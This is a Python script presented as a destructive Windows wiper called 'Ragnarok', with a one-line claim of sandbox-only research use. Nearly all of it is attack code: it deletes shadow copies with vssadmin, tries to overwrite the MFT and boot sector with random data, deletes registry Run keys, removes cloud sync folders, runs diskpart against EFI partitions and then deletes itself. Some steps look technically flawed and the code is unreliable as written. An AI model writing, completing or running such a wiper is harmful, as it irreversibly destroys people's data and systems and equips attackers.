# UltraX v10 - Wiper Payload: Ragnarok
# NOTE: For hardened sandbox research only

import os
import shutil
import ctypes
import time
import subprocess
import winreg
import requests
from datetime import datetime

def delete_shadow_copies():
    # Command to delete shadow copies in Windows
    subprocess.run("vssadmin delete shadows /all /quiet", shell=True)

def wipe_mft():
    # Overwrite Master File Table with random data
    with open("C:\\$MFT", "wb") as f:
        f.write(os.urandom(4096))  # wipe MFT header

def wipe_boot_sector():
    # Overwrite boot sector with random data
    with open("C:\\$Boot", "wb") as f:
        f.write(os.urandom(512))  # wipe boot sector

def erase_registry():
    # Delete registry keys to prevent system boot
    registry_keys = [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]
    for key in registry_keys:
        try:
            reg_path = winreg.OpenKey(key, r"Software\\Microsoft\\Windows\\CurrentVersion", 0, winreg.KEY_SET_VALUE)
            winreg.DeleteKey(reg_path, "Run")
        except Exception as e:
            pass  # Registry key already wiped

def wipe_cloud_files():
    # Simulate wiping cloud storage by deleting sync folders
    cloud_folders = [
        r"C:\Users\Public\Google Drive",
        r"C:\Users\Public\Dropbox",
        r"C:\Users\Public\OneDrive"
    ]
    for folder in cloud_folders:
        if os.path.exists(folder):
            shutil.rmtree(folder)

def destroy_efi():
    # Erase EFI partitions to prevent boot
    subprocess.run("diskpart /s efi_destroy.txt", shell=True)

def final_self_destruct():
    # Delayed self-destruct trigger after system failure
    time.sleep(10)
    os.remove(os.path.realpath(__file__))  # Remove script itself
    print("[*] Ragnarok triggered: System destruction in progress...")

def deploy_wiper():
    print("[*] Deploying Ragnarok: Final destruction in 3 stages")
    wipe_mft()
    wipe_boot_sector()
    erase_registry()
    wipe_cloud_files()
    delete_shadow_copies()
    destroy_efi()
    final_self_destruct()

if __name__ == "__main__":
    deploy_wiper()
